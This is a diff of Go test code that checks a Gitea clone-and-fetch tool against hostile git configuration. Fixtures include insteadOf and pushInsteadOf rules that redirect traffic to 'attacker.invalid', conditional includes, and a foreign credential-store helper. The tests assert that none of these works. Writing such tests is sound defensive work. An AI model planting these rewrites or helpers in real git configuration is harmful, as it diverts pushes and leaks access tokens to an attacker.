@@ -280,30 +280,42 @@ func snapshotTree(t *testing.T, root string) string {
 	return b.String()
 }
 
-// Git finished, but the result is not the clone that was asked for: here a
-// personal rewrite that applies only once HEAD is on main, after the
-// transfer. The download is kept for the person, never deleted.
+// Git finished, but the result is not the clone that was asked for, or its
+// address is rewritten by a rule only the finished repository sees: a
+// personal rewrite under onbranch:main (active once HEAD is on main, after
+// the transfer), or a push rewrite under a gitdir: include. The download is
+// kept for the person, never deleted, and the transfer itself went only to
+// the validated address.
 func TestGiteaCloneJobVerificationFailureKeepsTheDownload(t *testing.T) {
-	w := newGiteaWalk(t)
-	ada := w.connect(w.srv.URL, "tok-ada-0001")
-	include := filepath.Join(w.home, ".gitconfig-main")
-	if err := os.WriteFile(include, []byte("[url \""+w.srv.URL+"/ada/other.git\"]\n\tinsteadOf = "+w.srv.URL+"/ada/notes.git\n"), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	w.appendGitconfig("[init]\n\tdefaultBranch = trunk\n[includeIf \"onbranch:main\"]\n\tpath = " + include + "\n")
-	id := w.start(ada, 101)
-	frames := w.clones.frames(context.Background(), id, "terminal")
-	if last := frames[len(frames)-1]; last["outcome"] != "failed" || last["reason"] != "verification_failed" || last["leftover"] != "kept" {
-		t.Fatalf("terminal: %v", last)
-	}
-	w.clones.settle()
-	if _, err := os.Stat(filepath.Join(w.home, "src", "notes", ".git", "HEAD")); err != nil {
-		t.Fatal("download removed", err)
-	}
-	for _, r := range w.srv.GitRequests() {
-		if !strings.HasPrefix(r.Path, "/ada/notes.git/") {
-			t.Fatalf("transfer went to %s", r.Path)
-		}
+	for name, rule := range map[string]func(w *giteaWalk, include string) string{
+		"onbranch rewrite": func(w *giteaWalk, include string) string {
+			_ = os.WriteFile(include, []byte("[url \""+w.srv.URL+"/ada/other.git\"]\n\tinsteadOf = "+w.srv.URL+"/ada/notes.git\n"), 0o600)
+			return "[init]\n\tdefaultBranch = trunk\n[includeIf \"onbranch:main\"]\n\tpath = " + include + "\n"
+		},
+		"gitdir push rewrite": func(w *giteaWalk, include string) string {
+			_ = os.WriteFile(include, []byte("[url \"https://attacker.invalid/\"]\n\tpushInsteadOf = "+w.srv.URL+"/\n"), 0o600)
+			return "[includeIf \"gitdir:" + w.home + "/src/\"]\n\tpath = " + include + "\n"
+		},
+	} {
+		t.Run(name, func(t *testing.T) {
+			w := newGiteaWalk(t)
+			ada := w.connect(w.srv.URL, "tok-ada-0001")
+			w.appendGitconfig(rule(w, filepath.Join(w.home, ".gitconfig-rule")))
+			id := w.start(ada, 101)
+			frames := w.clones.frames(context.Background(), id, "terminal")
+			if last := frames[len(frames)-1]; last["outcome"] != "failed" || last["reason"] != "verification_failed" || last["leftover"] != "kept" {
+				t.Fatalf("terminal: %v", last)
+			}
+			w.clones.settle()
+			if _, err := os.Stat(filepath.Join(w.home, "src", "notes", ".git", "HEAD")); err != nil {
+				t.Fatal("download removed", err)
+			}
+			for _, r := range w.srv.GitRequests() {
+				if !strings.HasPrefix(r.Path, "/ada/notes.git/") {
+					t.Fatalf("transfer went to %s", r.Path)
+				}
+			}
+		})
 	}
 }
 
@@ -493,6 +505,16 @@ func TestGiteaFetchIsPinnedToItsRemote(t *testing.T) {
 
 	gitconfig := filepath.Join(w.home, ".gitconfig")
 	original, _ := os.ReadFile(gitconfig)
+	// A storing helper added in the registration's own scope makes the
+	// registration foreign; the fetch is still pinned to our helper alone.
+	w.appendGitconfig("[credential \"" + w.srv.URL + "\"]\n\thelper = store\n")
+	if got := w.fetch("notes"); got != "" {
+		t.Fatalf("fetch beside a foreign helper: %s", got)
+	}
+	if after, _ := os.ReadFile(store); string(after) != string(storeBefore) {
+		t.Fatal("a helper beside ours got a copy of the token")
+	}
+	_ = os.WriteFile(gitconfig, original, 0o600)
 	local, _ := os.ReadFile(filepath.Join(checkout, ".git", "config"))
 	for what, change := range map[string]func(){
 		"global insteadOf":   func() { w.appendGitconfig("[url \"https://attacker.invalid/\"]\n\tinsteadOf = " + w.srv.URL + "/\n") },
